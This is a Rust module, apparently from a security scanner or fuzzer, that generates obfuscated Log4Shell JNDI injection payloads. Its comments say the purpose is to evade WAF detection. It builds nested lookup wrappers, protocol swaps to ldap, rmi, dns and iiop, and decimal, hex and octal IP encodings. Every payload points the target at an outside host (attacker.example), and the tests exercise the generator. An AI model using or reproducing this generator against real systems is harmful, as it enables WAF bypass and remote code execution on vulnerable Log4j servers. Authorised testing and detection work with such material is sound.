//! JNDI/Log4Shell grammar-aware payload mutation.
//!
//! Generates semantically-equivalent variants of JNDI lookup injection
//! payloads — `${jndi:ldap://attacker.example/a}` and friends.
//! Log4j's lookup-substitution engine recurses through `${…}` expressions
//! before resolving the outermost JNDI reference, so wrapping any character
//! in `${lower:x}`, `${upper:x}`, `${env:NaN:-x}`, etc. produces a string
//! that single-pass WAF regex rules miss entirely.
//!
//! # Supported envelope forms
//!
//! - `${jndi:ldap://…}` — canonical Log4Shell vector
//! - `${jndi:ldaps://…}` — LDAP-over-TLS; semantically identical
//! - `${jndi:rmi://…}` — Java RMI protocol
//! - `${jndi:dns://…}` — DNS lookup (OOB detection even when LDAP blocked)
//! - `${jndi:iiop://…}` — CORBA IIOP
//! - `${jndi:corba://…}` — CORBA (alias for iiop in many JDKs)
//!
//! # Mutation strategies
//!
//! 1. **Character-level wrapping** — each character of `jndi` wrapped in
//!    `${lower:x}`, `${upper:x}`, `${${::-x}}` (default-value trick)
//! 2. **Environment-variable default** — `${env:NaN:-x}` substitutes when
//!    the env var is absent; the default value feeds the outer lookup
//! 3. **System-property default** — `${sys:nonexistent:-x}` variant
//! 4. **Date-format literal** — `${date:'x'}` injects a literal character
//!    via log4j's date pattern parser
//! 5. **Protocol swap** — ldap → ldaps / rmi / dns / iiop / corba cycling
//! 6. **Host obfuscation** — decimal IP, hex IP, octal IP representations
//! 7. **Nested recursion** — wrap the entire `jndi` prefix in a chain of
//!    `${lower:…}` lookups so no substring of the wire form reads `jndi`

use std::collections::HashSet;

/// JNDI expression opener; every Log4Shell payload begins with `${jndi:`.
pub(crate) const JNDI_OPEN: &str = "${jndi:";

/// Supported JNDI protocols (in priority order for protocol-swap mutation).
pub const JNDI_PROTOCOLS: &[&str] = &["ldap", "ldaps", "rmi", "dns", "iiop", "corba"];

/// Generate semantic-preserving JNDI mutations for a candidate payload.
///
/// Returns an empty `Vec` for non-JNDI inputs — the caller is expected to
/// have already confirmed the payload is JNDI via [`detect_type`] before
/// dispatching here. Passing a non-JNDI payload returns `[]` (no panic).
#[must_use]
pub fn mutate(payload: &str) -> Vec<String> {
    if payload.is_empty() || !detect_type(payload) {
        return Vec::new();
    }

    let mut out: Vec<String> = Vec::new();
    let mut seen: HashSet<String> = HashSet::new();

    let mut push = |v: String| {
        if seen.insert(v.clone()) {
            out.push(v);
        }
    };

    // ── Extract the protocol + host/path suffix ────────────────────────
    // Strip the outer `${…}` wrapper to get the inner `jndi:proto://host/path`
    // expression. We work with the inner string to compose obfuscations.
    let trimmed = payload.trim();
    let inner_opt = trimmed
        .strip_prefix("${")
        .and_then(|s| s.strip_suffix('}'));
    let inner = match inner_opt {
        Some(i) => i.trim(),
        None => return out,
    };

    // inner is now like `jndi:ldap://attacker.example/a`
    let rest_opt = inner
        .strip_prefix("jndi:")
        .or_else(|| inner.strip_prefix("JNDI:"))
        .or_else(|| inner.strip_prefix("Jndi:"));
    let proto_host = match rest_opt {
        Some(r) => r, // e.g. `ldap://attacker.example/a`
        None => {
            // Already-obfuscated form (${${lower:j}ndi:…}); can't safely
            // parse further — emit encoding-only variants.
            push(obfuscate_dollars(trimmed));
            return out;
        }
    };

    // Split `proto://host/path` at `://`
    let (proto, host_path) = match proto_host.split_once("://") {
        Some((p, h)) => (p, h),
        None => return out,
    };

    let canonical_proto = proto.to_ascii_lowercase();

    // ── 1. Character-level wrapping of `jndi` prefix ─────────────────
    // Wrap each character of "jndi" in a lookup substitution so no
    // contiguous substring of the output reads `jndi`. Three forms:

    // ${lower:x} — passthrough (lower:j = j, so this works for j,n,d,i)
    let lower_wrap: String = "jndi"
        .chars()
        .map(|c| format!("${{lower:{c}}}"))
        .collect();
    push(format!("${{{lower_wrap}:{proto_host}}}"));

    // ${upper:x} — same principle; result is uppercase letters but log4j
    // resolves case-insensitively for the `jndi` lookup prefix.
    let upper_wrap: String = "jndi"
        .chars()
        .map(|c| format!("${{upper:{c}}}"))
        .collect();
    push(format!("${{{upper_wrap}:{proto_host}}}"));

    // ${::-x} default-value trick — `${::-j}` has empty variable name so
    // always resolves to the default value `j`.
    let default_wrap: String = "jndi"
        .chars()
        .map(|c| format!("${{::-{c}}}"))
        .collect();
    push(format!("${{{default_wrap}:{proto_host}}}"));

    // ── 2. env: variable default substitution ────────────────────────
    let env_wrap: String = "jndi"
        .chars()
        .map(|c| format!("${{env:NaN:-{c}}}"))
        .collect();
    push(format!("${{{env_wrap}:{proto_host}}}"));

    // ── 3. sys: property default substitution ────────────────────────
    let sys_wrap: String = "jndi"
        .chars()
        .map(|c| format!("${{sys:x:-{c}}}"))
        .collect();
    push(format!("${{{sys_wrap}:{proto_host}}}"));

    // ── 4. date: literal character injection ─────────────────────────
    // Log4j's date pattern parser treats single-quoted strings as
    // literals: `${date:'j'}` resolves to the character `j`.
    let date_wrap: String = "jndi"
        .chars()
        .map(|c| format!("${{date:'{c}'}}"))
        .collect();
    push(format!("${{{date_wrap}:{proto_host}}}"));

    // ── 5. Protocol swap ─────────────────────────────────────────────
    for alt_proto in JNDI_PROTOCOLS {
        if *alt_proto != canonical_proto.as_str() {
            push(format!("${{jndi:{alt_proto}://{host_path}}}"));
        }
    }

    // ── 6. Host obfuscation (only for dotted-quad IPs or localhost) ──
    // Detect if the host part is a known IP or localhost to generate
    // alternate numeric forms. We handle attacker.example by leaving
    // host_path unchanged (name-based obfuscation is §7 below).
    push_host_obfuscations(host_path, proto, &mut push);

    // ── 7. Outer-dollar obfuscation ───────────────────────────────────
    // Prefix with a benign-looking `${::-}` prefix string to push the
    // `${jndi:` start past common regex anchors.
    push(format!("${{::-$}}{{jndi:{proto_host}}}"));

    // ── 8. Mixed-case jndi prefix ────────────────────────────────────
    // Some WAF rules match on literal `jndi` — capitalize first letter.
    push(format!("${{Jndi:{proto_host}}}"));
    push(format!("${{JNDI:{proto_host}}}"));

    // ── 9. Single-char env/lower hybrid chain ────────────────────────
    // First character via lower:, remaining via env:NaN:- default.
    let hybrid: String = {
        let mut s = "${lower:j}".to_string();
        for c in "ndi".chars() {
            s.push_str(&format!("${{env:X:-{c}}}"));
        }
        s
    };
    push(format!("${{{hybrid}:{proto_host}}}"));

    // Remove the input payload if it somehow crept in.
    out.retain(|v| v.trim() != payload.trim());
    out
}

/// Push IP address obfuscation variants for the host portion of a JNDI URL.
///
/// Only fires when the host is a dotted-quad IPv4 address or `localhost`.
/// For domain names we leave it as-is (domain obfuscation is DNS-level, not
/// our concern here — we'd need DNS resolution to build equivalents).
fn push_host_obfuscations(
    host_path: &str,
    proto: &str,
    push: &mut impl FnMut(String),
) {
    // Extract just the host (everything before first `/`)
    let host = host_path.split('/').next().unwrap_or(host_path);
    let path_suffix = &host_path[host.len()..]; // "" or "/…"

    // localhost → decimal IP (127.0.0.1 = 2130706433)
    if host == "localhost" {
        push(format!("${{jndi:{proto}://2130706433{path_suffix}}}"));
        push(format!("${{jndi:{proto}://0x7f000001{path_suffix}}}"));
        push(format!("${{jndi:{proto}://0177.0.0.01{path_suffix}}}"));
        return;
    }

    // Dotted-quad detection
    let octets: Vec<u8> = host
        .split('.')
        .filter_map(|s| s.parse::<u8>().ok())
        .collect();
    if octets.len() != 4 {
        return; // Not a dotted-quad — leave as-is
    }

    let decimal = octets
        .iter()
        .fold(0u32, |acc, &b| (acc << 8) | u32::from(b));
    let hex = format!("0x{decimal:08x}");
    // Octal octets: each byte as octal with leading zero
    let octal = octets
        .iter()
        .map(|b| format!("0{b:o}"))
        .collect::<Vec<_>>()
        .join(".");

    push(format!("${{jndi:{proto}://{decimal}{path_suffix}}}"));
    push(format!("${{jndi:{proto}://{hex}{path_suffix}}}"));
    push(format!("${{jndi:{proto}://{octal}{path_suffix}}}"));
}

/// Obfuscate the outer `${` / `}` delimiters using URL-encoded variants.
///
/// Some WAFs scan for the literal `${` ASCII sequence; percent-encoding
/// the `$` or `{` breaks that scan while leaving the log4j parser functional.
#[must_use]
fn obfuscate_dollars(payload: &str) -> String {
    payload
        .replace("${", "%24%7B")
        .replace('}', "%7D")
}

/// Detect whether the payload is a JNDI injection expression.
///
/// Accepts both canonical `${jndi:…}` forms and already-obfuscated forms
/// like `${${lower:j}ndi:…}` where the outer envelope is `${` / `}`.
/// Case-insensitive on `jndi`.
#[must_use]
pub fn detect_type(payload: &str) -> bool {
    let t = payload.trim();
    if t.is_empty() {
        return false;
    }
    let lower = t.to_ascii_lowercase();
    // Fast path: outer `${` … `}` wrapper containing `jndi:`
    // JNDI_OPEN is the canonical constant for this prefix (§10 COHERENCE).
    if lower.contains(JNDI_OPEN) {
        return true;
    }
    // Obfuscated form: outer `${` that leads to a nested `jndi` resolution.
    // This includes `${${lower:j}ndi:…}` and `${${::-j}${::-n}…}` — they
    // all start with `${` and the inner content reconstructs `jndi`.
    // Heuristic: outer envelope is `${…}` and inner contains `ndi:` with
    // at least one lookup substitution before it.
    if lower.starts_with("${") && lower.ends_with('}') {
        let inner = &lower[2..lower.len() - 1];
        // Inner contains a lookup wrapper before `ndi:` — this is a split-jndi form.
        if (inner.contains("lower:j") || inner.contains("upper:j")
            || inner.contains("::-j") || inner.contains("env:") && inner.contains(":-j")
            || inner.contains("sys:") && inner.contains(":-j")
            || inner.contains("date:'j'"))
            && inner.contains("ndi:")
        {
            return true;
        }
    }
    false
}

#[cfg(test)]
mod tests {
    use super::*;

    // ── Envelope detection ────────────────────────────────────────────────

    #[test]
    fn detect_canonical_ldap() {
        assert!(detect_type("${jndi:ldap://attacker.example/a}"));
    }

    #[test]
    fn detect_all_canonical_protocols() {
        for proto in JNDI_PROTOCOLS {
            let payload = format!("${{jndi:{proto}://attacker.example/a}}");
            assert!(
                detect_type(&payload),
                "detect_type must fire for protocol {proto}: {payload}"
            );
        }
    }

    #[test]
    fn detect_obfuscated_lower() {
        assert!(detect_type(
            "${${lower:j}ndi:ldap://attacker.example/a}"
        ));
    }

    #[test]
    fn detect_obfuscated_upper() {
        assert!(detect_type(
            "${${upper:j}ndi:ldap://attacker.example/a}"
        ));
    }

    #[test]
    fn detect_obfuscated_default() {
        assert!(detect_type(
            "${${::-j}ndi:ldap://attacker.example/a}"
        ));
    }

    #[test]
    fn detect_rejects_non_jndi() {
        assert!(!detect_type(""));
        assert!(!detect_type("${env:HOME}"));
        assert!(!detect_type("${lower:j}"));
        assert!(!detect_type("<!-- SSI -->#exec cmd"));
        assert!(!detect_type("' OR 1=1--"));
        assert!(!detect_type("<script>alert(1)</script>"));
    }

    #[test]
    fn detect_case_insensitive_jndi_prefix() {
        assert!(detect_type("${JNDI:ldap://attacker.example/a}"));
        assert!(detect_type("${Jndi:ldap://attacker.example/a}"));
    }

    // ── Mutation correctness ──────────────────────────────────────────────

    #[test]
    fn mutate_returns_non_empty_for_canonical_ldap() {
        let muts = mutate("${jndi:ldap://attacker.example/a}");
        assert!(!muts.is_empty(), "canonical ldap must produce mutations");
    }

    #[test]
    fn every_protocol_round_trips() {
        for proto in JNDI_PROTOCOLS {
            let payload = format!("${{jndi:{proto}://attacker.example/a}}");
            let muts = mutate(&payload);
            assert!(
                !muts.is_empty(),
                "protocol {proto} produced no mutations; payload: {payload}"
            );
        }
    }

    #[test]
    fn mutate_produces_lower_wrap_variant() {
        let muts = mutate("${jndi:ldap://attacker.example/a}");
        let has_lower = muts.iter().any(|m| m.contains("${lower:j}"));
        assert!(
            has_lower,
            "must produce lower-wrap variant: {muts:?}"
        );
    }

    #[test]
    fn mutate_produces_upper_wrap_variant() {
        let muts = mutate("${jndi:ldap://attacker.example/a}");
        let has_upper = muts.iter().any(|m| m.contains("${upper:j}"));
        assert!(has_upper, "must produce upper-wrap variant: {muts:?}");
    }

    #[test]
    fn mutate_produces_env_default_variant() {
        let muts = mutate("${jndi:ldap://attacker.example/a}");
        let has_env = muts.iter().any(|m| m.contains("${env:NaN:-j}"));
        assert!(has_env, "must produce env:NaN default variant: {muts:?}");
    }

    #[test]
    fn mutate_produces_protocol_swap_variants() {
        let muts = mutate("${jndi:ldap://attacker.example/a}");
        // Starting from ldap, we should get rmi and dns at minimum.
        let has_rmi = muts.iter().any(|m| m.contains("${jndi:rmi://"));
        let has_dns = muts.iter().any(|m| m.contains("${jndi:dns://"));
        assert!(has_rmi, "must produce rmi protocol swap: {muts:?}");
        assert!(has_dns, "must produce dns protocol swap: {muts:?}");
    }

    #[test]
    fn mutate_omits_input_payload() {
        let p = "${jndi:ldap://attacker.example/a}";
        let muts = mutate(p);
        assert!(
            !muts.iter().any(|m| m == p),
            "input must not appear in mutations"
        );
    }

    #[test]
    fn mutate_returns_bounded_count() {
        let muts = mutate("${jndi:ldap://attacker.example/a}");
        assert!(
            muts.len() <= 50,
            "mutation count must be bounded (got {})",
            muts.len()
        );
    }

    #[test]
    fn mutate_is_deterministic() {
        let p = "${jndi:ldap://attacker.example/a}";
        let a = mutate(p);
        let b = mutate(p);
        assert_eq!(a, b, "mutation must be deterministic");
    }

    #[test]
    fn mutate_rejects_non_jndi() {
        assert!(mutate("").is_empty());
        assert!(mutate("plain text").is_empty());
        assert!(mutate("${env:HOME}").is_empty());
    }

    #[test]
    fn mutate_handles_localhost() {
        let muts = mutate("${jndi:ldap://localhost/a}");
        let has_decimal = muts.iter().any(|m| m.contains("2130706433"));
        let has_hex = muts.iter().any(|m| m.contains("0x7f000001"));
        assert!(
            has_decimal,
            "localhost must produce decimal IP obfuscation: {muts:?}"
        );
        assert!(
            has_hex,
            "localhost must produce hex IP obfuscation: {muts:?}"
        );
    }

    #[test]
    fn mutate_handles_dotted_quad_host() {
        let muts = mutate("${jndi:ldap://192.168.1.1/a}");
        // 192.168.1.1 = (192 << 24) | (168 << 16) | (1 << 8) | 1 = 3232235777
        let has_decimal = muts.iter().any(|m| m.contains("3232235777"));
        assert!(
            has_decimal,
            "dotted-quad must produce decimal IP: {muts:?}"
        );
    }

    #[test]
    fn mutate_produces_default_colon_colon_variant() {
        let muts = mutate("${jndi:ldap://attacker.example/a}");
        let has_default = muts.iter().any(|m| m.contains("${::-j}"));
        assert!(
            has_default,
            "must produce ${{::-j}} default-value variant: {muts:?}"
        );
    }

    #[test]
    fn mutate_produces_mixed_case_prefix() {
        let muts = mutate("${jndi:ldap://attacker.example/a}");
        let has_camel = muts.iter().any(|m| m.starts_with("${Jndi:"));
        let has_upper = muts.iter().any(|m| m.starts_with("${JNDI:"));
        assert!(has_camel, "must produce ${{Jndi:...}} variant: {muts:?}");
        assert!(has_upper, "must produce ${{JNDI:...}} variant: {muts:?}");
    }

    // ── Fuzz / property tests ─────────────────────────────────────────────

    /// LAW 1 anti-rig: mutate must never panic on any byte sequence
    /// in the JNDI envelope. Random-looking JNDI bodies must produce
    /// bounded output without crashing.
    #[test]
    fn mutate_never_panics_on_random_jndi_bodies() {
        let long_body = "x".repeat(2048);
        let bodies: &[&str] = &[
            "",
            "ldap://",
            "ldap://a",
            "ldap://a/",
            "ldap://a/b/c/d",
            "rmi://\x00\x01",
            "dns://\u{00FF}\u{00FE}",
            "ldap://192.168.1.1/",
            "ldap://localhost",
            "iiop://[::1]/a",
            long_body.as_str(),
        ];
        for body in bodies {
            let p = format!("${{jndi:{body}}}");
            let _ = mutate(&p);
        }
    }

    /// LAW 12: envelope constants are pinned for backwards-compat.
    #[test]
    fn jndi_envelope_constant_is_pinned() {
        assert_eq!(JNDI_OPEN, "${jndi:");
    }

    /// LAW 12: all canonical protocols must remain in JNDI_PROTOCOLS.
    #[test]
    fn jndi_protocols_include_all_canonical_forms() {
        let required = &["ldap", "ldaps", "rmi", "dns", "iiop", "corba"];
        for proto in required {
            assert!(
                JNDI_PROTOCOLS.contains(proto),
                "JNDI_PROTOCOLS missing required protocol: {proto}"
            );
        }
    }

    /// Mutations that encode the `$` / `{` characters must still be
    /// detectable as JNDI by the detection heuristic (they're a mutated
    /// form of a JNDI payload, not raw ones). The obfuscate_dollars helper
    /// produces URL-encoded forms — those are accepted as benign by detect_type
    /// (which looks for the raw `${jndi:` sequence) but represent real threats.
    /// This test confirms the helper does not panic.
    #[test]
    fn obfuscate_dollars_does_not_panic() {
        let payload = "${jndi:ldap://attacker.example/a}";
        let obfuscated = obfuscate_dollars(payload);
        assert!(
            obfuscated.contains("%24%7B"),
            "must encode ${{: {obfuscated}"
        );
    }
}
